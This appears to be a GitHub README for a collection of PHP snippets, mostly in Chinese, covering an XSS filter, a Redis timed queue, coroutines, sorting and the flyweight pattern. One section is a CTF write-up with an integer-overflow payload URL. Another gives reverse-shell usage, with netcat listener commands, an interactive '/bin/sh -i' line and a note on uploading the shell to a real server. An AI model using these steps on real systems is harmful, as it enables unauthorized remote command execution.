# PHP
### xsshtml.class.php   
#### filter xss php class 
Usage: 
```
<?php
require('xsshtml.class.php');
$html = '<html code>';
$xss = new XssHtml($html);
$html = $xss->getHtml();
?>
```

PHP Version > 5.0
IE7+ or other browser

### timeQueue.class.php   
#### 基于redis的定时任务
```
$obj = new timeQueue();
//添加任务并制定多少秒之后执行
$obj->add_task('test',[1,2],3);
$obj->add_task('demo',[1,2],2);
$obj->add_task('bug',[1,2],12);
$obj->add_task('test',[3,4],1);
$obj->add_task('test',[5,6],8);
//回调函数
$func = function ($args){
    var_dump($args);
};
//设置需要监听的任务
$obj->listen_task('test',$func);
$obj->listen_task('demo',$func);
//移除一个已经注册了的任务
$obj->remove_task('bug');
$obj->run();

---------------
在相应时间之后，相关事件开始运行

```

### PHP协程 coroutine.php
```
php coroutine.php
多任务调度器
task A 0
task BBB 0
task A 1
task BBB 1
task A 2
task BBB 2
task A 3
task BBB 3
task A 4
task BBB 4
task BBB 5
task BBB 6
task BBB 7
task BBB 8
task BBB 9
task BBB 10
task BBB 11
task BBB 12
task BBB 13
task BBB 14
两个任务是交替运行的, 而在第二个任务结束后, 只有第一个任务继续运行.
```


### 一道PHP CTF 题目 
```
<?php
include('config.php');
if(empty($_GET['user'])) die('exit');
$user = ['admin', 'password'];
if($_GET['user'] === $user && $_GET['user'][0] != 'admin'){
    echo $flag;
}
?>
<h3><?php echo $flag;?>

上面一段php程序，要求攻击者能够获得$flag即为成功
分析：
按照正常逻辑是无法获得flag的，but，php是一个神奇的语言。
官方曾发布过一个补丁：
https://bugs.php.net/bug.php?id=69892
问题就出在这儿：

测试： 
php -r "var_dump([0 => 0] === [0x100000000 => 0]);" 
bool(true)
返回了true，整形溢出
构造payload:
http://localhost/test.php?user[1]=password&user[4294967296]=admin
2^32 == 0x100000000 == 4294967296 所以是：user[4294967296]
所有条件均符合，flag获得，如下图：
```
![](https://github.com/LockGit/PHP/blob/master/ctf.jpeg)


### php-reverse-shell.php 一个反弹shell的php程序
```
终端1：
Mac环境：
➜  ~ nc -l -v -n 0 1234

Linux：
nc -v -n -l -p 1234


终端2：
---
注释：
$shell = 'uname -a; w; id; /bin/sh -i';
man sh
-i        If the -i option is present, the shell is interactive.
忘记了这个参数的作用了，sh -i 是激活交互的方式
---

执行：
	php php-reverse-shell.php
现实环境中上传shell后，访问让其运行即可
程序会fork一个子进程，并尝试连接某个ip的某个端口
测试时用的是本地的127.0.0.1 1234端口
➜  ~ php php-reverse-shell.php
Successfully opened reverse shell to 127.0.0.1:1234
➜  ~

此时终端1立即获得一个shell的交互界面，尝试去任意命运执行吧
```

### yield_sort.php 使用php模仿python的yield归并排序2个有序序列
```
将已有序的子序列合并,得到完全有序的序列.
例：
$a=[1,3,5,7,9,18,19,20];
$b=[2,4,6,8,22];
➜  PHP git:(master) ✗ php yield_sort.php
1--->2--->3--->4--->5--->6--->7--->8--->9--->18--->19--->20--->22
场景1：
前端负载均衡，nginx日志分散在多个机器上时,有序合并所有日志
```

### outsort.php 排序多个有序数组为一个有序数组(外排序)
```
$a = [1,5,7,11,25,78,90,102];
$b = [2,6,8,11,34,42,89,100,120,140];
$c = [4,9,13,27,55,72,92,102,111];
$d = [3,13,19,21,66,85,99,108,138];

执行合并并且排序：php outsort.php

注：这是一个不考虑内存大小的暴力方法，所有并非在外排序
如果数组内容非常大是不可以这么排序的，$save_arr 在达到指定的count之后需要清空$save_arr并释放内存，将排好序的内容写入硬盘，
而$a,$b,$c,$d也是做演示，实际应该将文件分块以后逐步对小的文件块排序并保存，在读取时也是依次读取适当的内存数据，会有频繁的磁盘读写，
这个地方演示省去了。外排序即使文件再大通过分解最终合并也会完成排序，只是时间问题，当然相对
内排序要慢的多，而内排序是以空间换取时间的一种方式。（例如彩虹表暴力破解也是以空间换取时间的一种方式而已）

外排序的算法步骤如下：
假设文件需要分成k块读入，需要从小到大进行排序。
（1）依次读入每个文件块，在内存中对当前文件块进行排序（应用恰当的内排序算法）。此时，每块文件相当于一个由小到大排列的有序队列。
（2）在内存中建立一个最小值堆，读入每块文件的队列头。
（3）弹出堆顶元素，如果元素来自第i块，则从第i块文件中补充一个元素到最小值堆。弹出的元素暂存至临时数组。
（4）当临时数组存满时，将数组写至磁盘，并清空数组内容。
（5）重复过程（3）、（4），直至所有文件块读取完毕。
```

### sharePool.php 享元模式
```
add 在经常听到的设计模式(值-对象模式，代理模式，工厂模式，适配器模式，桥接模式）之外的一个设计模式（享元模式）
模式分析：
　　享元模式是一个考虑系统性能的设计模式，通过使用享元模式可以节约内存空间，提高系统的性能。
　　享元模式的核心在于享元工厂类，享元工厂类的作用在于提供一个用于存储享元对象的享元池，用户需要对象时，首先从享元池中获取，如果享元池中不存在，
   则创建一个新的享元对象返回给用户，并在享元池中保存该新增对象。

优点
　　享元模式的优点在于它可以极大减少内存中对象的数量，使得相同对象或相似对象在内存中只保存一份。
　　享元模式的外部状态相对独立，而且不会影响其内部状态，从而使得享元对象可以在不同的环境中被共享。

缺点
　　享元模式使得系统更加复杂，需要分离出内部状态和外部状态，这使得程序的逻辑复杂化。
　　为了使对象可以共享，享元模式需要将享元对象的状态外部化，而读取外部状态使得运行时间变长。
```
